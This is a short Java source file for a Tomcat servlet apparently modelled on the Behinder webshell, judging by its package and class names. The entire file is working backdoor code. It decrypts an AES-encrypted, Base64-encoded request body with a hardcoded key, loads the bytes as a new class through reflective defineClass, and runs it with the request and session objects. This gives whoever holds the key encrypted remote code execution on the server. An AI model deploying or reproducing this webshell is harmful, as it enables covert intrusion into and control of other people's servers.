package com.example.memshelltomcat;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.HashMap;

public class behinder3 implements Servlet {
    @Override
    public void init(ServletConfig config) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }
    public static Class defClass(byte[] classBytes) throws Exception {
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        return (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(),classBytes,0,classBytes.length);
    }
    @Override
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;
        HttpSession session = request.getSession();

        HashMap pageContext = new HashMap();
        pageContext.put("request", request);
        pageContext.put("response", response);
        pageContext.put("session", session);

        String k = "e45e329feb5d925b";
        session.putValue("u", k);
        Cipher c = null;
        try {
            c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));

            //revision BehinderFilter
            byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
            Class evilclass = defClass(evilclass_byte);
            evilclass.newInstance().equals(pageContext);
//            class U extends ClassLoader{
//                U(ClassLoader c){
//                    super(c);
//                }
//                public Class g(byte []b){
//                    return super.defineClass(b,0,b.length);
//                }
//            }
//            new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}
